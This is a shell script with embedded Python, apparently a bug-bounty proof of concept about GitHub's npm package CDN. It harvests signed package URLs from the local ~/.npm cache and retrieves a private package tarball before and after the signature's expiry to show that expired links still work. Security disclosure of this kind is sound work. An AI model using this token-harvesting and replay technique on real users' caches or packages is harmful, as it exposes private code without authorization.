#!/bin/bash
set -euo pipefail
python3 - <<'PY'
import os,re,urllib.parse,urllib.request,urllib.error,time,hashlib,io,tarfile,json,pathlib
root=pathlib.Path.home()/'.npm'
pat=re.compile(rb'https://pkg-npm\.githubusercontent\.com/[^\s"\'<>\\]+')
urls=[]
for p in root.rglob('*'):
    if not p.is_file(): continue
    try: data=p.read_bytes()
    except: continue
    for m in pat.findall(data):
        try: u=m.decode('utf-8')
        except: continue
        if u not in urls: urls.append(u)
print('CACHE_URL_FOUND',int(bool(urls)),'COUNT',len(urls))
if not urls: raise SystemExit('no pkg-npm URL in restored npm cache')
u=urls[0]; q=urllib.parse.parse_qs(urllib.parse.urlsplit(u).query)
se=q.get('se',[None])[0]
if not se or 'sig' not in q: raise SystemExit('URL lacks SAS expiry/signature')
exp=__import__('datetime').datetime.fromisoformat(se.replace('Z','+00:00')).timestamp()
print('URL_MODEL',json.dumps({'host':urllib.parse.urlsplit(u).hostname,'query_keys':sorted(q),'expiry_epoch':exp,'seconds_remaining':round(exp-time.time(),3)}))

def fetch(label):
    try:
        with urllib.request.urlopen(urllib.request.Request(u,headers={'User-Agent':'bb-team-own-object'}),timeout=30) as r:
            body=r.read();status=r.status;h={k.lower():v for k,v in r.headers.items()}
    except urllib.error.HTTPError as e:
        body=e.read();status=e.code;h={k.lower():v for k,v in e.headers.items()}
    got=hashlib.sha256(body).hexdigest(); marker=False
    if status==200:
        try:
            with tarfile.open(fileobj=io.BytesIO(body),mode='r:gz') as tf:
                marker=hashlib.sha256(tf.extractfile('package/secret.txt').read()).hexdigest()=='9ed76c23fbb1516e4afeae78a5913e3cdea697ae349011187d6032de21d08c44'
        except Exception: marker=False
    print(label,json.dumps({'epoch':time.time(),'seconds_vs_exp':round(time.time()-exp,3),'status':status,'bytes':len(body),'sha256':got,'private_marker_match':marker,'x_cache':h.get('x-cache'),'x_cache_hits':h.get('x-cache-hits'),'x_served_by':h.get('x-served-by'),'age':h.get('age')}))
    return status,marker
# Independent no-standing controls.
def code(url):
    try:
        with urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent':'bb-team-own-control'}),timeout=20) as r:return r.status
    except urllib.error.HTTPError as e:return e.code
print('DIRECT_CONTROLS',json.dumps({'private_repo_unauth':code('https://api.github.com/repos/mr-benty/hc-pkgcache-src-1788220522'),'private_registry_unauth':code('https://npm.pkg.github.com/@mr-benty%2fhc-pkgcache-1788220522')}))
pre=fetch('PRE_EXPIRY_CACHE_URL')
if not(pre[0]==200 and pre[1]): raise SystemExit('pre-expiry capability did not return exact private package')
if time.time()<exp+5: time.sleep(exp+5-time.time())
post=fetch('POST_EXPIRY_CACHE_URL')
if not(post[0]==200 and post[1]): raise SystemExit('post-expiry private package not retrieved')
PY
